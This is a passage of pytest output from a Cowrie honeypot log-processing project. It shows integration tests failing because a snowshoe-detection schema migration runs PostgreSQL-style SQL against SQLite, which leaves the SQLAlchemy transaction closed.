E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:29,982:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:29,982:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:29,983:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:29,983:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:29,990:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:29,990:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:29,992:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:29,992:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:29,993:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:29,993:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:29,998:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:29,998:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:29,999:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:29,999:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:30,001:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:30,001:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:30,002:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:30,002:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:30,003:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:30,003:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:30,007:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:30,007:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:30,008:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:30,008:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:30,009:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:30,009:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:30,010:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:30,010:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:30,011:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,011:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,014:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,014:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,015:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,015:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,015:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,015:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,016:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,016:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,016:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:30,016:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_________ TestReportingQueries.test_top_commands_with_json_abstraction _________

self = <test_reporting_queries.TestReportingQueries object at 0x7756b43d1d10>

    def test_top_commands_with_json_abstraction(self) -> None:
        """Test top commands query using JSON abstraction layer."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            # Create database and apply migrations
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
>           apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_reporting_queries.py:146: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2aa4750>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:30,521:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:30,521:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:30,522:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:30,522:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:30,529:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:30,529:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:41:30,531:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:30,531:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:41:30,535:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:30,535:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:41:30,537:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:30,537:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:41:30,538:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:30,538:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:41:30,542:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:30,542:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:41:30,543:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:30,543:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:41:30,544:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:30,544:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:41:30,545:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:30,545:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:41:30,546:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:30,546:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:41:30,549:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:30,549:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:41:30,550:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:30,550:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:41:30,551:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,551:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,552:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,552:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,553:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,553:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,553:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,553:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,554:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,554:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:41:30,554:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:41:30,554:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______ TestReportingQueries.test_top_file_downloads_with_json_abstraction ______

self = <test_reporting_queries.TestReportingQueries object at 0x7756b45735c0>

    def test_top_file_downloads_with_json_abstraction(self) -> None:
        """Test top file downloads query using JSON abstraction layer."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            # Create database and apply migrations
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
>           apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_reporting_queries.py:228: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2abc050>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:41:31,056:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:31,056:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:41:31,056:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:41:31,056:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
